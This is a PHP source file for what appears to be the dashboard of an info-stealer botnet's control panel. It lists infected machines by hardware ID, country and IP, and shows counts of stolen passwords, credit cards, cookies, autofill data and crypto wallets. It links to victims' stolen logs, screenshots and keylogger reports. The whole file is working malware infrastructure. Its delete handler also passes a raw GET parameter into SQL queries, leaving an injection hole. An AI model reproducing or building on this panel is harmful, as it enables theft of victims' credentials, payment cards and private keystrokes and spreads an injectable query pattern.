<?php
 include('header.php');

 function dateDifference($date_1 , $date_2 , $differenceFormat = '%y%m%d%h%i' )
 {
	 $datetime1 = date_create($date_1);
	 $datetime2 = date_create($date_2);
	
	 $interval = date_diff($datetime1, $datetime2);
	
	 return $interval->format($differenceFormat);
	
 }

?>

		<!--end content-->

		
		
		
		 
		 <div class="col-md-12">
		<?php
		//  include('count.php');
		?>
		<?php
		 if(!isset($_GET['page'])){
		  
		  $page = 1;
		
		}
		else {
		
		 $page = (int)$_GET['page'];
		
		}
		
		$post_at_page = 10;//عدد البوستات التي يعرضها في كل صفحة
		$query_post_count = mysqli_query($condb,"SELECT * FROM `bot`");
		$query_count = mysqli_num_rows($query_post_count);
		mysqli_free_result($query_post_count);

        $query_count = (int)ceil($query_count / $post_at_page);
        		
		/*تحقق ن إدا كانت المدخلات في بارميتر page*/		
		if(($page > $query_count)||($page <= 0)){
		 
		  echo '<div style="opacity: 0.8;" class="alert alert-danger text-center" role="alert"><h4>You dont have Bots or Database Empty </h4></div>';
		  
		
		}		
		$start = ($page - 1) * $post_at_page;
		$end = $post_at_page;
        $querypost="SELECT * FROM bot ORDER BY ID_Bot DESC LIMIT $start,$end";
			mysqli_query($condb,"set character_set_server='utf8'"); 
			mysqli_query($condb,"SET NAMES 'utf8'");
        $result=mysqli_query($condb,$querypost);
            mysqli_query($condb,"set character_set_server='utf8'"); 
			mysqli_query($condb,"SET NAMES 'utf8'");
			echo '<div class="table-responsive">
			   <table class="table table-bordered table-hover" style="opacity: 0.8;background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
				 <tr>
				 <td class="col-md-2">HWID</td>
				 <td class="col-md-1">Country</td>
				 <td class="col-md-1">IP</td>
				 <td class="col-md-1">Stat</td>
				 <td class="col-md-3">&nbsp;PWS |&nbsp; Cards |&nbsp; Cookies |&nbsp; AutoFill |&nbsp; Wallets</td>
				 <td class="col-md-1">Last Seen</td>
				 <td class="col-md-1">Action</td>
				
				 </tr>';
        while($rows=@mysqli_fetch_array($result))
           {

              echo'<tr>
			  <td class="col-md-1">'.$rows['HWID'].'</td>
			  <td class="col-md-1"><img src="../img/flags/'.strtolower($rows['Country']).'.png"  style="width:40px;height:20px;" class="img-responsive" alt="stat" title="'.$rows['Country'].'" /></td>
			  <td class="col-md-2">'.$rows['IP'].'</td>';

			  $d2 = $rows['Date_Time'];
			  $d = date('Y/m/d h:i:s a', time());

			  if (dateDifference($d2,$d) < 4) {
	
				echo '<td class="col-md-1"><span style="font-size:13px;" class="label label-success">Online</span></td>';
				}else{
					
					echo '<td class="col-md-1"><span style="font-size:13px;" class="label label-danger">offline</span></td>';
				}
				

				$sql_log = 'SELECT * FROM `logs` WHERE `hwid`="'.$rows['HWID'].'"';
				$query_logs = mysqli_query($condb,$sql_log);
				$rows2=@mysqli_fetch_array($query_logs); 
				
				echo '<td class="col-md-2">&nbsp;&nbsp;&nbsp;'.$rows2['Passwords'].'&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;'.$rows2['CreditCards'].'&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;'.$rows2['Cookies'].'&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;'.$rows2['AutoFill'].'&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;'.$rows2['Wallets'].'</td>';

			  echo '<td class="col-md-2">'.$rows['Date_Time'].'</td>';


             
			  echo'<td class="col-md-2">
								   <a title="logs" href="../'.$rows2['File_log'].'" style="padding-left: 2px;padding-right: 2px;margin-left: 2px;margin-right: 2px;"><span  class="ion-android-download" style="color:#46DD14; font-size:20px;"></span></a>
								   <a title="Screenshots" href="screenshot.php?hwid='.$rows['HWID'].'" style="padding-left: 2px;padding-right: 2px;margin-left: 2px;margin-right: 2px;"><span class="ion-monitor" style="color:#56A8FC; font-size:20px;"></span></a>
								   <a title="Keylogger Reports" href="keylogger.php?hwid='.$rows['HWID'].'" style="padding-left: 2px;padding-right: 2px;margin-left: 2px;margin-right: 2px;"><span  class="ion-clipboard" style="color:#46DD14; font-size:20px;"></span></a>
								   <a title="Delete Bot" href="index.php?id='.$rows['HWID'].'"  style="padding-left: 2px;padding-right: 2px;margin-left: 2px;margin-right: 2px;"><span class="ion-android-delete" style="color:#ff1c1c; font-size:20px;"></span></a>
								   </td>
								  
								   </tr>

				    ';
						 } 
						
						
             echo " </table>";

				echo '<div class="row">
					<div class="col-md-12 text-center">
					  <nav>
						  <ul class="pager">
							<li><a href="?page='.($page-1).'" class="hvr-icon-forward" style="opacity: 0.8;border-radius:0px;border-color:#fff;background-color:#232323;"><span class="fa fa-chevron-circle-left hvr-icon"></span> Prev </a></li>
							<li><a href="?page='.($page+1).'" class="hvr-icon-back" style="opacity: 0.8;border-radius:0px;border-color:#fff;background-color:#232323;"> Next  <span class="fa fa-chevron-circle-right hvr-icon" ></span></a></li>
						  </ul>
					  </nav>
					</div>
				</div>';
				
						?>


			

			
			 
			</div>

		 
		 
		 </div>
		</div>
<?php
$id = @$_GET['id'];
    if(isset($id)){
		mysqli_query($condb,"DELETE FROM `bot` WHERE `HWID`='$id'");
		mysqli_query($condb,"DELETE FROM `logs` WHERE `hwid`='$id'");
		mysqli_query($condb,"DELETE FROM `keylogger` WHERE `HWID`='$id'");
		mysqli_query($condb,"DELETE FROM `screenshot` WHERE `HWID`='$id'");

		echo '<meta http-equiv="refresh" content="2;url=index.php" />';
	}

?>
<?php include('footer.php');?>